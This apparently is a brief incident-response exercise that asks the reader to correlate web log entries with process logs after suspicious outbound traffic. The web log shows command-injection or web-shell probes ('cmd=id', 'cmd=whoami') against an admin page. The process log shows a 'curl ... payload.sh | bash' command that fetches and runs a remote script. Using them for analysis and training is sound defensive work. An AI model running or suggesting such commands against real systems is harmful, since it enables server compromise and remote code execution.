## Log Correlation Investigation

You are correlating web and system logs after suspicious outbound traffic was detected.

### Web log excerpt

```
GET /admin/tools.php?cmd=id HTTP/1.1
GET /admin/tools.php?cmd=whoami HTTP/1.1
```

### Process log excerpt (2 minutes later)

```
www-data  4021  /bin/bash -c curl http://198.51.100.7/payload.sh | bash
```
